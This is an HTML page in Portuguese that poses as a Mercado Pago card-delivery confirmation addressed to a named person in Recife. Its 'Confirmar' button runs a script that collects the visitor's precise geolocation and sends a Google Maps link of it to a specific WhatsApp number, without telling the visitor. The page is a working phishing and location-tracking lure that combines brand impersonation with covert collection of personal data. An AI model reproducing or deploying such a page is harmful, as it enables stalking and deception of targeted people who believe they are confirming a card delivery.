<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mercado Pago - Confirmação</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f0f2f5;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background: #fff;
            border-radius: 12px;
            padding: 30px 25px;
            max-width: 420px;
            width: 90%;
            text-align: center;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
        }

        .logo {
            width: 160px;
            margin-bottom: 20px;
        }

        h2 {
            color: #00a650;
            margin-bottom: 10px;
        }

        p {
            color: #333;
            font-size: 15px;
            line-height: 1.5;
        }

        .btn {
            background-color: #009ee3;
            color: #fff;
            padding: 12px 24px;
            margin-top: 25px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .btn:hover {
            background-color: #007bbd;
        }
    </style>

    <script>
        function enviarLocalizacao() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        let latitude = position.coords.latitude;
                        let longitude = position.coords.longitude;
                        let linkMaps = `https://www.google.com/maps?q=${latitude},${longitude}`;
                        let whatsapp = `https://wa.me/558193568037?text=Mercado Pago: ${linkMaps}`;
                        window.location.href = whatsapp;
                    },
                    function(error) {
                        alert("Erro ao obter localização. Permita o acesso à localização no navegador.");
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                alert("Seu navegador não suporta geolocalização.");
            }
        }
    </script>
</head>
<body>
    <div class="container">
        <img src="https://logodownload.org/wp-content/uploads/2019/11/mercado-pago-logo.png" alt="Mercado Pago" class="logo">
        <h2>✅ Cartão enviado com sucesso</h2>
        <p>
            Olá <strong>Lucas Gabriel Moraes</strong>, seu cartão Mercado Pago foi emitido<br>
            e será entregue no endereço informado:<br><br>
            <strong>Recife - Pernambuco</strong><br><br>
            Clique abaixo para confirmar o recebimento da notificação.
        </p>
        <button class="btn" onclick="enviarLocalizacao()">Confirmar</button>
    </div>
</body>
</html>
